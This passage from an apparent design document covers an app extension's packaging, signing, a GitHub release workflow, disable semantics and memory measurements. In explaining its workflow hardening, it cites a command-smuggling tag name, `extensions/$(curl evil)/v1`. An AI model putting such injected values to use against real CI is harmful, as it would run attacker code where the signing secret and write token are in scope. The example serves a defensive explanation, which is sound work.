   parses (section 7.10). Self-tests it by merging it into an empty feed
   (`extension-signing feed-merge <nonexistent> feed-entry.json --id <id> --out ...`) and feed-checking
   the result, so the fragment is proven to parse as a real entry, not merely as JSON.

Every step fails loudly (`set -euo pipefail` plus explicit checks); nothing is skipped silently, and
there is no flag anywhere that bypasses a check the way `git commit --no-verify` would.

**Five new `tools/extension-signing` commands beyond `keygen`/`sign`/`verify`,** all linking source from
the app the same way `ExtensionSignature.cs`/`PublisherKeys.cs` already did, never referencing it (still
no Avalonia in this tool):

- `report <manifest.json> --contract <ver> --cs2demokit <ver> [--app-version <ver>]` links
  `SemVersion.cs`, `VersionRange.cs`, `ExtensionHostInfo.cs`, `ExtensionManifest.cs`,
  `PackCompatibility.cs` and `CompatibilityReport.cs`, all pure value types with no dependency beyond
  each other and the BCL. It takes the host's three values as arguments rather than linking
  `ExtensionHost.cs`, which would pull in `AppVersionInfo` and, through it, `GitHubReleaseNotesService`
  and the app's own `IReleaseNotesService` surface for one static method: `CompatibilityReport.Describe`
  already takes an `ExtensionHostInfo` explicitly rather than reading `ExtensionHost.Current` itself, so
  nothing here needed to change for this to work. Exits non-zero when the verdict is `Incompatible`;
  `CompatibilityMatrixTests` remains the release gate that proves this script's inputs are exactly right,
  this command is only what prints the same verdict during packaging.
- `manifest <assembly.dll>` links nothing new: it reads the `extension.json` manifest resource directly
  out of the PE's metadata tables (`System.Reflection.Metadata.PEReader`) and prints its raw bytes,
  without loading the assembly. Loading it (even reflection-only, through `MetadataLoadContext`) would
  put the extension's referenced assemblies on this tool's probe path for no reason: nothing here runs
  any code from the DLL, only reads a resource every managed assembly carries as ordinary PE data.
- `zip <dir> --out <zip>` is `DeterministicZip` (`tools/extension-signing/DeterministicZip.cs`, under
  `DemoViewer.NET.Extensions.Loading` beside the signing types): a manual walk refusing a reparse point
  the same way `ExtensionSignature.Walk` does (a second implementation, not shared, since the two walks
  keep different files: this one keeps `extension.sig`, the digest walk skips it), sorted entries, a
  fixed `ZipArchiveEntry.LastWriteTime` (1980-01-01, the DOS epoch) and `ExternalAttributes` (Unix
  `0644`) on every entry so two zips of the same tree hash the same regardless of the machine's clock or
  umask. Verified by zipping the same staged, unsigned directory twice within one run and diffing the
  sha; a resigned build's zip differs in `extension.sig`'s `signature` field alone, since ECDSA signing
  draws a fresh random nonce every time, never in the digest or anything the zip mechanism controls.
- `feed-merge <existing.json> <entry.json> --id <id> --out <merged.json> [--allow-downgrade]` and
  `feed-check <feed.json>` link `ExtensionFeed.cs` (already linking `ExtensionManifest.cs` et al. for
  `report`). The merge itself is `ExtensionFeedMerge.Merge` in its own file,
  `tools/extension-signing/FeedMerge.cs`, under `DemoViewer.NET.Extensions.Updates`: it operates on
  `System.Text.Json.Nodes.JsonNode` rather than the `ExtensionFeed` records, so a member this app does
  not parse yet (a future one) round-trips untouched instead of being dropped by a record rebuild, and
  validates the merged result with `ExtensionFeed.Parse` before returning it. Rules: an entry whose
  version matches one already in the feed replaces it in place, at whatever position it held, and never
  counts as a downgrade (correcting a shipped version is not publishing something older); a version that
  matches nothing existing and is higher than the current highest is always accepted; one that is lower
  than or equal to it is refused unless `--allow-downgrade`; the result is always sorted highest first.
  `tools/extension-signing/FeedMerge.cs` is also linked into
  `src/App/DemoViewer.NET.App.Tests/DemoViewer.NET.App.Tests.csproj` (one more `<Compile Include>`
  beside item 28's four), so `ExtensionPackagingTests` exercises the rules directly in C#, not only
  through the CLI; its fixtures are `FakeFeeds`' existing entry/feed builders, the same ones
  `ExtensionFeedTests` and `ExtensionUpdateServiceTests` use, so a fragment the test builds is exactly
  the shape the script itself writes.

**The zip, as produced**, matches section 7.10's layout exactly:

```
DemoViewer.NET.Extensions.StratBook.dll
DemoViewer.NET.Extensions.StratBook.xml
extension.json
extension.sig                             present whenever a signing key was available
```

No satellite culture directories exist today; the staging step copies one when the build's `.deps.json`
lists a `resources` entry for it, at its own relative path.

**The tag convention.** A real release is cut by pushing `extensions/<id>/v<version>` (for example
`extensions/net.demoviewer.pack.stratbook/v1.0.1`), which the script's own check requires to agree with
the manifest's `version`. That is a different string from section 7.10's release tag for the zip itself,
`<id>-v<version>` (`net.demoviewer.pack.stratbook-v1.0.1`, no slashes, matching the URL
`ExtensionFeedSource`/`ExtensionFeed`'s example already assumed before this item built the workflow that
produces it) and from the rolling feed release's tag, `extensions-<id>`. Three different tags for three
different reasons: the first triggers the workflow and is checked, not shown to users; the second holds
one version's assets and never changes; the third holds the one `extensions.json` every version's entry
is merged into and is replaced on every release.

**`.github/workflows/release-extension.yml`.** Triggered by a push matching `extensions/*/v*`, or
`workflow_dispatch` with an `id` input (`type: choice`, the one known id today), a `dry_run` input
(default `true`) and `allow_downgrade` (default `false`). Two jobs, `build-and-pack` (`contents: read`)
and `publish` (`needs: build-and-pack`, `contents: write`, gated on `do_publish`), so the write token
and the signing secret are both out of scope for a dry run's job entirely, not merely unused by it.

Every value that can carry attacker-supplied text (`github.event.inputs.*`, a ref-derived id) is passed
through a step's `env:` and read back as a shell variable, never interpolated as `${{ }}` into `run:`
script text: GitHub expands `${{ }}` into the script's source before the shell ever runs it, so a tag
named `extensions/$(curl evil)/v1` or a crafted dispatch input would otherwise execute on the runner,
signing secret and write token both in scope. `build-and-pack`'s first step resolves the id this way
(from the tag when the ref is one, else the input) and refuses it outright unless it matches the
manifest's own id shape (`ExtensionManifest.IsValidId`) before anything downstream touches it; it also
resolves `do_publish`: a tag push always publishes, a dispatch run only when its ref IS that same tag
and `dry_run` is explicitly `false`, every other case (including any dispatch from a branch) is a dry
run regardless of the input, since a branch is never the thing a release tag names. `github.sha` and
`github.repository` stay as direct `${{ }}` text (not user-suppliable; the existing convention in
`release.yml`), everything else moves through `env:`.

`build-and-pack` then runs the ext suite's standard tier, builds `App.Tests`, runs
`CompatibilityMatrixTests` alone, then `pack-extension.sh` (`DV_EXTENSION_SIGNING_KEY` passed only when
`do_publish == '1'`; `--dry-run` appended otherwise, and the script itself refuses that secret in
`--dry-run` regardless, so the gate holds even if a caller wires the secret unconditionally some other
way), and uploads the zip, its sha256 and the feed entry fragment as a workflow artifact on every run,
so a dry run's output is inspectable from the Actions UI without re-running anything.

`publish` runs only when `do_publish == '1'`, downloads that artifact, and merges and validates the
rolling feed **before** touching the per-version release: a refused downgrade (or any other merge
failure) then leaves nothing created or uploaded, never an orphan release with no feed entry. Fetching
the existing feed treats "absent" (`gh release view extensions-<id>` reports no such release) as the
only "no feed yet" case, since this run is then the one that creates that release; a release that
exists but carries no `extensions.json` asset is left alone and fails the job, since that is an
anomalous state (a prior run died mid-publish, or the asset was removed by hand) that needs manual
repair, not a silent restart from empty. Any other `gh` failure (auth, a rate limit, a transient API
error) also fails the job outright, for the same reason: taking "the download failed" as "there is no
feed" would republish a one-entry feed over a real one with every other version's history in it.

Only once the merge and `feed-check` succeed does `publish` create or update the per-version `gh
release` under the `<id>-v<version>` tag with the zip and its sha256 as assets (idempotent against a
re-run: `gh release view` first, `upload --clobber` if it already exists, `create` only if it does
not), `--latest=false` (so this release never becomes GitHub's "latest", which would misdirect anyone
browsing releases by eye; it has no bearing on how either Velopack's `GithubSource` or
`vpk download github`'s delta seed pick the app's own release, since both walk the release list looking
for an asset literally named `RELEASES`/`releases.<channel>.json`, never relying on "latest"). It then
compares the uploaded asset's actual `.url` (`gh release view --json assets --jq`, the field confirmed
by hand against a real release in this repo; the same call's `.apiUrl` is the API endpoint, not the
download link) against the url the feed entry fragment already computed, failing on any mismatch. Last,
it creates the rolling release (only if it did not already exist) and uploads the already-merged
`extensions.json`, `--clobber`; the local file is named `extensions.json` before upload, not renamed
through `gh`'s `#label` syntax, which sets a display label, never the served file name.

**Concurrency.** A constant group, `release-extension`, not keyed on the id: with one extension this
costs nothing (there is nothing else to serialize against), and it sidesteps needing the id before a
job starts at all. A second extension that wants independent release cadences needs a per-id group fed
by a job's own output to a dependent job, the shape `publish` already uses for `do_publish`.

**The `ci.yml` dry-run step.** The `build` job, after the normal solution build, runs
`pack-extension.sh net.demoviewer.pack.stratbook --dry-run` with no signing key, catching a packaging
regression (a file the deps.json-derived staging list stops picking up, a manifest edited without a
rebuild, a compatibility report gone `Incompatible`) on every PR rather than only when a release is cut.
`release.yml` is untouched: it does not run on pull requests, and the app installer already bundles
whichever extension version the heads reference at app release time with no change needed here.

**Action before the first release.** Same secret `DV_EXTENSION_SIGNING_KEY` section 7.9 names: store the private key
`keygen` wrote (outside every git working tree) as that GitHub repository secret, the same way
`DV_SIGN_*`/`DV_NOTARY_PROFILE` already work in `release.yml`. Until it is set, a real (non-dry-run) run
of this workflow fails at the signing step with that fact stated plainly; a dry run (the dispatch default)
works with no secret at all.

**Versioning (item 39).** The extension's version is computed, not edited. `src/Extensions/StratBook/version.json`
is a Nerdbank.GitVersioning file that inherits the root one and sets `version` to `0.1`, so the extension
is `0.1.<height>` where the height counts the commits that touched `src/Extensions/StratBook/` (its
`pathFilters` are `.` and an exclusion for the test project) since that line was last changed;
`versionHeightOffset` is -1 so the commit that introduced the file reads `0.1.0`. A change anywhere else
in the repo leaves the extension's version alone, which is the independent cadence decision 5 asked for;
that includes `src/Extensions/ExtensionManifest.targets` itself, one level up, so a fix to the stamping
ships under the extension's current version. Its `publicReleaseRefSpec` is `main`, the app's own `v*`
release tags (an app release builds from its tag, not from `main`, and bundles the extension, so the
bundled copy must read clean) and the extension's release tags; a build off any other ref carries a
`-g<sha>` prerelease label and sorts below the release it precedes. Two such dev builds of the same
`major.minor.patch` compare by the hash text, which says nothing about which is newer: the loader's
"strictly newer than shipped" rule is only meaningful between releases, or between a release and a dev
build. `release.tagName` is `extensions/net.demoviewer.pack.stratbook/v{version}`, which is what
`nbgv tag` creates, from the plain `major.minor.patch` on any commit.

The committed `extension.json` is a template whose `version` is the literal `{nbgv}`.
`src/Extensions/ExtensionManifest.targets`, imported by the extension csproj, runs before
`AssignTargetPaths` (after NBGV's `GetBuildVersion`), writes the template with `$(NuGetPackageVersion)`
in place of the placeholder to `obj/.../extension.json`, and adds that file as the embedded resource and
the copy beside the DLL; the placeholder must appear exactly once or the build fails. A second extension
would import the same file and get the same behaviour from its own `version.json`. `pack-extension.sh`
asks `nbgv` for the version first (restoring the tool manifest if needed), checks the tag against it
before building, and, since the tag is itself a public-release ref and reads clean from any commit, a
real run also refuses a tagged commit that is not on `origin/main`. After the build it checks that the
stamped copy says that version, equals the embedded copy byte for byte, and equals the template with the
placeholder filled in. `CompatibilityMatrixTests` asserts
the same three things from the test binary's side, plus that the manifest's major.minor.patch equals the
assembly's informational version. The first minor of the extension is 0.1; `requiresHost` is unchanged.

**Cutting a release, step by step.** Merge the change to `main`, then on that commit run
`dotnet nbgv tag -p src/Extensions/StratBook` and push the tag it prints
(`extensions/net.demoviewer.pack.stratbook/v<version>`). Nothing is bumped by hand; the tag must agree
with the computed version or the workflow refuses it. The workflow builds, tests, signs, zips, creates the
release and updates the feed with no further action; watch its run in the Actions tab. To preview without
publishing, dispatch the workflow by hand with `dry_run` left at its default and read the artifact it
uploads. `dotnet nbgv get-version -p src/Extensions/StratBook` shows what the next tag would be.

**What is not yet done.** Section 7.8 leaves item 37 the rename of the shipped manifest copy from the
bare `extension.json` to `<id>.extension.json`, needed once a second extension ships beside this one in
the same output directory; that touches `ShippedPack.BesideApp`, the app csproj and the loader/matrix
tests, none of them this item's hot file (a release workflow), so it is deliberately left for whichever
item adds that second extension, not done here.

---

## 8. Disable semantics

"Off" means, per resource:

| Resource | When turned off at runtime | After restart with it off |
|---|---|---|
| UI (tabs, sections, panes, lanes, menus, keybinds, settings pages, chips) | Gone immediately (gate is already live; sections reconcile by identity) | Never built |
| Background jobs (evaluators, mining, inbox, lineup clips, migrations) | Evaluators stop at the next `Wants()` poll; queued jobs owned by the pack are cancelled by owner tag; a job already running finishes its current unit | Never queued |
| Indexing passes (Round Index, Grenade walk, Suggested Tags, Round Facts if pack-owned) | Stop at the next demo; nothing new written | Not run. Library indexing does strictly less work |
| Resident memory (`SituationIndex`, `GrenadeIndex`, `SignatureCache`, cached VMs) | Released in session (decision 3; Phase 1 item 8) | Not allocated |
| Startup cost (index loads, Team Identity rebuild, store construction) | n/a | None |
| Data on disk (stores in 3.6, cache sidecars, record fields) | Kept, untouched | Kept, untouched |

**Existing data.** Nothing is deleted when the pack is turned off. The settings page can offer "Delete
Strat Book data" as a separate, confirmed action that removes the paths in the pack's `StoreDescriptor`s;
cache sidecars are regenerable, `strats/`, `tags/`, `teams.json`, `review-queue.json` and the dossier
stores are user work and must be called out by name in the confirmation.

**Round Facts while off (item 2).** Both the writer and the reader are gated: `RoundFactsEvaluator` writes
nothing and `RoundFactsSource` answers "no rows" and forwards no `Updated`, so winner tints, situation joins
and tag labels go with the pack rather than showing rows written while it was on. The rows stay in the cache
records and come back with the pack; a bare run cached under one gate state is not served under another.

**Stale cache while off.** Library keeps indexing new demos without pack passes. The pack fields of those
records are absent (or, after Phase 4, the `Packs` entry is missing). Fields of records indexed
before the switch stay as they were.

**Re-enabling.** The pack's evaluators report every demo whose pack fingerprint is missing or stale through
`PendingPaths()`, which is the existing mechanism, so re-enabling backfills automatically. The cost is a
re-index of everything indexed while off, which on a large library is the same order as a first index.
If Round Facts is in the pack, the highlights fingerprint must be split first (section 9), or each toggle also
re-scans every demo's highlights. The settings page should say so ("N demos will be re-indexed in the background") and the backfill should
be visible and pausable in the queue, per the standing rule that all background work goes through it.

**Live toggle (item 8, as built).** Live in both directions, and turning off releases the pack's memory in
session (decision 3). A core `PackSwitch` subscribes to the gate's `Changed` once per pack and acts on real
transitions only: the resolved `IsEnabled(pack.FeatureId)` against the state the lifecycle was last put in,
so a settings write that leaves the pack where it was does nothing. `App.StartPacks` is its startup pass.

- *Off to on:* `OnEnabledAsync(EnabledInSession, ct)`, the same code path as startup: one attach item
  first ("Strat Book: attach services", which attaches the lineup clips, Team Identity (its file read and
  `StartAsync` are queued from inside it, so the Library team filter is not held behind the index loads),
  the facts refresher, the zone graphs and every resident built lazily before a release), then the two
  index loads, all queue items at user priority on the pack's serial; then a user-priority `SectionCompute`
  item on the same serial, owned by the pack id ("Strat Book extension: find demos to re-index"), re-polls
  the library through the coordinator, so the pack's evaluators submit every demo whose pack fields are
  missing or stale and the backfill is visible and pausable in the queue. Open 2D Playback tabs and the
  shell react through the gate's `Changed` as before.
- *On to off:* the enable's token is cancelled, every queued pack item goes by owner tag through
  `IDemoProcessingQueue.CancelOwned(ownerTag)` (a running one finishes its unit; a parse the library co-owns
  stays), and the release itself is one `SectionCompute` item at user priority, owner the pack id, on the
  same serial, so a large index never leaves memory on the UI thread and never beside a load still running.
  `OnDisabledAsync` returns that item's completion.
- *Ordering.* Every item of the pack's own (loads, attach, release) shares one serial, so nothing of the
  pack's state changes outside a totally ordered item, and each carries the lifecycle epoch it was queued
  under: every enable and disable bumps it, an enable also drops a release still queued (by owner), and an
  item that runs under an older epoch does nothing. So a fast off-on leaves everything attached and the
  live view intact (shutdown's lineup flush still writes), and a fast on-off leaves nothing loaded.
- *What release means.* The residents are container singletons that core surfaces hold references to
  (Team Identity for the Library filter, the situation index for the shell), so the object cannot be
  replaced; its state can. Each implements `IPackResident`: `Release` unsubscribes from the sources that
  would refill it (`DemoCacheStore.Changed`, the evaluators' `Written`/`Indexed`, the index's `Changed`),
  writes anything pending (lineups, the signature cache) and drops the loaded data; `Attach` subscribes
  again and the next load rebuilds. Released: `SituationIndex`, `GrenadeIndex` (and its lineup document),
  `TeamIdentityService` (side keys, assignments, joins, both files), `LineupClipService` (plan, ranks,
  requests), `TagFactsRefresher`, `WatchedSituationsService` (the new-hit groups; the saved watches stay),
  `StratMiningService` (the quiet timer, the patterns, the `SignatureCache`), and the zone graphs in
  `AssetZonePlaceResolverSource` (only pack code reads them). `StratBookPackInstances` keeps the built
  residents across a release and nulls its typed view, so shutdown flushes nothing that was dropped and a
  re-enable restores and re-attaches everything built lazily before the release. A mine or a lineup render
  still running in the heavy lane when the release runs (their items set no serial) skips its next step
  once detached and writes nothing back; the release lets it end (bounded by one batch) before dropping the
  signature cache, which is not thread-safe.
- *Not released:* the pack's tab view-models (container singletons the modules hand to the shell; their
  result lists are bounded by the last query and their map assets by the last map shown) and the pack's
  small user-truth stores (strats, tags, dossier notes, veto history, proposals, profile, site regions),
  which are the user's files and cheap. The hub shows no "stopping" state: its tab is gone the instant the
  gate flips; the release item is visible in the queue instead.
- *First run.* On a fresh desktop install `StartPacks` waits while `SettingsService.NeedsFirstRun` is true;
  the wizard's Finish or Skip writes settings, which is a gate change like any other, and the pack starts
  if its answer resolves on (accept, or Skip with the default) and stays unbuilt if it resolves off. The
  browser never shows the wizard and never waits. Upgrades with the flag set start as today. Item 22 moved
  the Library filter's and the provenance chip's resolve of Team Identity and the provenance source off
  the shell's own constructor and into the two contributions, reached only while each one's gate is on.
  With the pack explicitly off that means neither service is built at shell construction at all. With the
  pack on, the default, the Library's own constructor reaches the same resolve at the same moment the old
  eager constructor injection did (its first `RebuildFilters`), so the enable's attach item is still only
  the first thing to READ Team Identity's files, as before item 22; a read that reaches a detached service
  (a queued one that lost the race with a release) reads and writes nothing.
- *Measured* (`StratBookLiveToggleTests`, `[Category("Budget")]`, 160 synthetic demos with 24 rounds and
  60 grenades each, a mine and a watch seeded): an enable builds about 21 MB on the GC heap; the release
  leaves 0.5 MB after the first off-on-off cycle and 0.0 MB after the second, so nothing grows per toggle.

**Session restore.** If the persisted active tab id belongs to a disabled pack, restore lands on Library.
Pack session blobs of a disabled pack are preserved in the session file untouched, so re-enabling restores
the collapsed rail.

**WASM.** Same switch, same semantics; there is less to turn off because the browser already keeps strat
data for the session only.

---

## 9. Risks

- **Boundary drift.** Under (a) nothing stops a new core-to-pack reference. Mitigate with a test that scans
  the core namespaces' `using`s for pack namespaces (cheap), until (b) makes it a compile error.
- **Round Facts placement.** If it moves into the pack, `MergedRulesBuild` must accept ruleset contributions
  and `RoundTrack` must tolerate no tints. The highlights fingerprint is computed over every effective
  ruleset, `round_facts` included (`MergedRulesBuild.Fingerprint`, :72-84), so dropping the ruleset from the
  merged set on toggle would mark every demo's highlights stale and force a library-wide Reels re-scan in
  both directions. Either exclude `round_facts` from that fingerprint first (it already has its own,
  `RoundFactsIdentity`) or keep the ruleset in the merged set and gate only the evaluator's writes; Library
  and Highlights forward passes change shape and need a bench A/B (`AnalysisBench` with `--retained`,
  interleaved per the bench-variance note). Decision 1 puts it in the pack, so the split is item 2.
- **Team Identity in the Library.** `Services/Teams`, the Library team filter and the provenance chip are
  all new on this branch (nothing under `Services/Teams` at the merge base), so putting Teams in the pack
  takes away nothing main's users have today. Keeping it core instead means its factory must stop
  constructing pack stores.
- **2D Playback regressions.** Phase 3 rewires the busiest tab VM (3,560 lines). The follow-card render
  test locates cards by list position and will break on any panel reordering. Land Phase 3 one item at a
  time with UiCapture before and after.
- **Concurrent work.** The editor's start-block and clock work landed on 2026-10-02. Phase 3 items 15 and
  19 touch `StratCanvasViewModel` and the keymap; any further editor item should avoid those two files
  while they are in flight (section 11 lists the hot files).
- **Evidence gaps.** No measurement exists of what the pack costs in RAM or index time when on. M0 and
  item 9 close that; section 12 holds the numbers. Also unverified: what session restore does after
  `TrySelectTab` returns false (item 4 covers it).
- **Scope creep toward (c).** The add-on doc's security and distribution work is a separate decision. None
  of this plan depends on it, and none of it should be pulled forward on the Strat Book's account.

---

## 10. Decisions (2026-10-02)

1. **Boundary:** the whole Strat Room is in the pack, and so are Round Facts, Teams and Provenance, so "off"
   removes their indexing cost. The Review Queue stays core, since Reels uses it.
2. **Default:** first-run setup asks whether to turn it on; the answer sets the master switch. Upgrades keep
   it on.
3. **Toggling:** turning it off is live and must also release its memory in session. No "reclaimed on
   restart" fallback.
4. **Name:** users see it as an **extension** ("Strat Book extension"). The per-section switches stay under
   the master switch.
5. **Structure:** each extension lives in its own directory from the start (Phase 0b) and becomes its own
   csproj once the edges are cut (Phase 5), so extensions can be released on a different cadence from the
   app (Phase 6).
6. **How strictly a staged extension is pinned to the app build.** The extension compiles
   against the app assembly, Avalonia, CS2DemoKit, Playback2D and the rest of the app's packages, and a
   staged copy built against a different patch of any of them loads and fails only when the mismatched
   member is first called. Two options:
   - **(A) Exact pin.** The manifest carries a `builtAgainst` block (app version, Avalonia, CS2DemoKit,
     Playback2D, the other shared packages) written by CI, and the loader refuses any staged copy not
     built against the running app's exact versions. Safest: a staged copy can never meet a member it was
     not compiled against. Cost: every app release that bumps a shared package needs an extension
     re-release, and an extension release targets exactly one app release.
   - **(B) Contract range plus checks.** The manifest's `requiresHost`, `requiresCs2DemoKit` and
     `minAppVersion` ranges, plus the loader's reference-version check and load-time probe (section 7.8).
     An extension release rides across app releases that keep the shared package versions, and a bump
     that changes an assembly version is caught at load. Residual risk: a package whose assembly version
     does not move with its package version, and anything compiled on first use (lambda bodies,
     `Contribute`, views), can still fail after the loader reported success.

   Item 34 implements (B). *Decided 2026-10-03: (B), as built*, with two rules on top. Every extension
   release states the oldest extension framework it runs on (`requiresHost`, section 7.7), and the
   contract never takes a breaking change outside a major release of the app, so an extension built for
   one app major keeps loading across that major's minors and patches. Item 39 (section 7.11) makes the
   extension's version computed by Nerdbank.GitVersioning from its own `version.json`, starting at 0.1.


---

## 11. Build order

The items in section 6 are the units. Each was built on its own branch
(`feature/strat-book-ext-<item>-<slug>`, cut from `feature/strat-book` when the item started), reviewed
before its merge, and followed by the standard tier; the Browser head was built in Release after each
group of merges. Items were merged in the order their dependencies allow.

Two items in flight never shared a hot file. The hot files are `App.axaml.cs`, `MainViewModel.cs`, `LibraryTabViewModel.cs`, `SettingsView.axaml` and `SettingsViewModel.cs`, `FeatureCatalog.cs`, `Playback2DTabViewModel.cs` and `Playback2DView.axaml`, `Playback2DKeymap.cs`, `DemoProcessingQueue.cs`, `MergedRulesBuild.cs`, `DemoCacheModels.cs`, `StratCanvasViewModel.cs`, and `StratBookPack.cs` once it exists. The environmental items (M0, 2,
9) parse demos or run the bench and never overlapped each other.

## 12. Measurements

Filled in by M0 and item 9. Resident set after startup and library index time, on a copy of the demo
library, with the pack on (M0), off at startup (9), and after an on-to-off toggle in session (9).

| State | Resident set after startup | Library index time | Notes |
|---|---|---|---|
| Pack on (M0, head f48f6695) | GC heap 368.7 MB immediately after settling (median of 5); drops to 323.5 MB after 90s more idle with no queue activity to explain it (median of 5), likely a .NET buffer-pool trim rather than app or pack behavior, since the isolated probe drops by the same amount with no app, no queue and no Avalonia at all | full 6-evaluator pass 14.5 s versus library+highlights-only 9.3 s, pooled median of 3 runs x 4 demos each (about 57% slower, a floor: see §12.1 on library's own asymmetry; run medians ranged 44 to 87%) | macOS arm64, Release, head f48f6695, 382-demo copy. `PrivateMemorySize64` reads 0 on this OS; see §12.1. |
| Pack on, rerun (9, head 396495e1) | GC heap 369.9 MB immediately after settling (median of 5); after 90s more idle the drop M0 saw recurred in only 2 of 5 trials (down to ~324.6 MB, the same ~45 MB M0 measured), while the other 3 rose instead (to ~374.8 MB), so the late median (374.8 MB) sits above the early one | full 6-evaluator pass 13.5 s versus library+highlights-only-with-the-pack-still-on 7.7 s, one run x 4 demos each (about 76% slower). Not the pack-off comparison; see the pack-off row and §12.3 for that | macOS arm64, Release, head 396495e1 (code-identical to fa77bad5), fresh copy of the same 382-demo library |
| Pack off at startup (9) | GC heap 29.6 MB immediately after settling (median of 5); 29.7 MB after 90s more idle (median of 5), essentially flat: no drift recurs when nothing of the pack ever decodes a sidecar. Working set 203.8 MB early / 202.4 MB late (median), but individual trials ranged 116 to 206 MB late, noise with no counterpart in the GC heap | library + highlights only, which is what `Wants()` resolves the full evaluator list to with the pack off: two runs over the same 8 demos, 9.2 s and 9.4 s median; `round_facts` confirmed excluded from the merged ruleset (`MergedRulesBuild.EnabledDoc("round_facts") is null`) | macOS arm64, Release, head 396495e1, fresh copy of the same library with `Features.Overrides["pack.stratbook"] = false` in settings.json |
| On, then off in session (9) | GC heap: on 369.9 MB, then off 84.1 MB immediately after the release, then off 31.2 MB after 90s more idle (matching the pack-off-at-startup row's 29.6 MB within 1.6 MB), then on again 369.4 MB (medians of 3, real `IDemoProcessingQueue`). The 84.1 MB immediate figure is transient (gone after 90s idle; likely a pool trim), not retained pack state: once it settles, re-enabling costs about the same as the first enable, not more | not measured in session; the library+highlights-only figure is the pack-off row above | macOS arm64, Release, head 396495e1, same 382-demo copy as the pack-on rerun, pack on at boot, off and on again through `SettingsService.Write` + `PackSwitch` |

### 12.1 M0 method and numbers

Reproduced by `tools/strat-book-baseline/run.sh` (also usable directly: the three `StratBookPackBaselineTests`
probes in `DemoViewer.NET.App.Tests`, each `[Category("Environmental")]` and skipped unless its env var is
set, so the standard tier never runs them). Machine: a 16 GB macOS arm64 dev machine. Build: Release. Head:
`f48f6695`. The copy: the live config dir (`~/Library/Application Support/DemoViewer.NET/`), minus
`lineup-clips/` (1.0 GB of rendered GIFs, no measurement reads them), `logs/`, `crash.log` and `*.bak`; 79 MB
copied, 382 demos indexed. In the copy's `settings.json`: `Highlights.BackgroundScan`,
`ProcessingQueue.BackgroundProcessingEnabled`, `Situations.BackgroundIndex`, `Grenades.BackgroundIndex` and
`Grenades.RenderLineupClips` all forced to `false`, so the only work at boot is the fixed startup-load list
`App.axaml.cs` runs today, nothing opportunistic layered on top.

**Bugs found and fixed while measuring.** Two passes before this one produced numbers that looked plausible
and were wrong, both recorded here because item 9 is about to point the same harness at a gated-off build
and would hit them again blind.

1. The resident-set wait loop checked `queue.QueuedCount == 0 && queue.RunningCount == 0` as part of
   "settled". With `ProcessingQueue.BackgroundProcessingEnabled` off, any ordinary library demo still owed a
   tier-2 pass sits `Queued` forever (Background-priority `DemoProcessing` jobs never start; that is what
   the setting means), so the loop always ran its full 90s deadline, silently, on backlog that has nothing
   to do with the pack. The pack's own readiness flags (`SituationIndex.IsReady`, `GrenadeIndex.IsReady`,
   `TeamIdentityService.IsLoaded`, and `TeamIdentityService.StartAsync`'s own `QueueJobKind.TeamsCommand`
   job, which the method had not been checking at all) were actually true within a few seconds. Fixed by
   waiting on the specific readiness flags plus `ActiveCount(QueueJobKind.TeamsCommand)` and
   `ActiveCount(QueueJobKind.StoreLoad)`, and by throwing instead of silently continuing past a deadline.
   This is NOT the whole story; see the resident-set entry below, which the fix exposed rather than closed.
2. The indexing-time probe called `Evaluate`/`EvaluateForward` directly on already-indexed demos, bypassing
   `Wants()`. Round Facts, Round Index, Suggested Tags and Highlights each separately check a fingerprint or
   state field against the cache record first and return immediately when it already matches, which it does
   for every demo in an indexed library: the second pass's "full" timing was still measuring mostly Grenade
   Index's walk (the one evaluator with no such check) plus the retained parse itself, not the combined cost
   of the four pack evaluators plus Highlights. Fixed by clearing the three fingerprints and the analysis
   state on each timed demo's cache record immediately before timing it, in BOTH modes
   (`DemoCacheStore.UpdateExisting`), forcing a genuine recompute either way, the scenario "library index
   time" actually needs to answer (what re-indexing a demo costs, not what re-checking a current one costs).
   Library's own gate (membership in a private, un-forceable "pending" dictionary, populated only by its
   own `RescanAsync` reconcile, which nothing calls here) is still not forced in either mode, and that is
   NOT symmetric the way the paragraph above first claimed. In the full arm, `library.Evaluate` returns at
   the membership miss before doing anything, so the retained parse never pays for library's final-score
   entity-tracker replay. In the reduced arm, that replay still runs: it is driven by the forward pass's own
   `ForwardNeeds.FinalState` flag (requested because `library.ForwardFor` always asks for it), not by
   whether `library.EvaluateForward` goes on to use the result, so the `Tap` inside `ForwardPassRunner.Run`
   does the replay regardless. The reduced arm is therefore carrying a real cost (library's own replay) that
   the full arm skips, which UNDERSTATES the full-versus-reduced delta below by some amount. Forcing library
   symmetrically would need reflection into its private membership dictionary (no public per-path force
   exists, unlike the other three) plus reading what `IndexTier2Core`'s fan-out argument does to the other
   evaluators first, to avoid double-counting; not attempted at M0's size. Treat the delta below as a floor,
   not a ceiling: the true cost of turning the four pack evaluators (plus Grenade Index's walk, which the
   full arm alone pays) off is at least what is measured here, and probably somewhat more.

**Resident set after startup** (`ResidentSetAfterStartup`, one process per trial, since a second boot in the
same process carries the first one's JIT and GC committed high-water): boots the real composition root
(`App.BuildServices`) against the copy, waits for the situation index, grenade index and Team Identity to
report ready and Team Identity's own update job to finish (bug 1 above), forces three full
blocking/compacting collections, then reads `Process.WorkingSet64`, `Process.PrivateMemorySize64` and
`GC.GetTotalMemory(true)`. Settling now takes 3 to 4 seconds, not ~190. An "early" snapshot is taken there;
the probe then subscribes to the processing queue's `Changed` event from right after `App.BuildServices`
returns (so a job that starts and finishes between two polls, invisible to a periodic `Items` snapshot, is
still logged) and keeps that subscription through 90 more seconds, then takes a "late" snapshot. Five
trials of each:

| Trial | Early working set | Early GC heap | Late working set | Late GC heap | Committed (same both) |
|---|---|---|---|---|---|
| 1 | 416.4 MB | 369.0 MB | 277.0 MB | 323.8 MB | 227.7 MB |
| 2 | 374.4 MB | 368.7 MB | 275.1 MB | 322.9 MB | 227.6 MB |
| 3 | 415.9 MB | 368.6 MB | 267.5 MB | 322.9 MB | 227.5 MB |
| 4 | 376.7 MB | 369.0 MB | 269.2 MB | 323.8 MB | 227.7 MB |
| 5 | 411.1 MB | 368.7 MB | 359.2 MB | 323.5 MB | 227.6 MB |
| **median** | **411.1 MB** | **368.7 MB** | **275.1 MB** | **323.5 MB** | **227.6 MB** |

Within "early" and within "late" the GC heap is tight (each within 0.4 MB across trials); working set is
noisier in both (trial 5's late figure is an outlier at 359.2 MB against the other four clustered 267 to
277 MB), matching a scar already on record for this machine for a different tool (`bench-run-variance.md`:
AnalysisBench drifts 27 to 31% between sessions). `PrivateMemorySize64` is 0 in every trial on this OS, not
a measurement error; committed bytes are identical between early and late in every trial, to five figures,
so the GC is not returning segments to the OS.

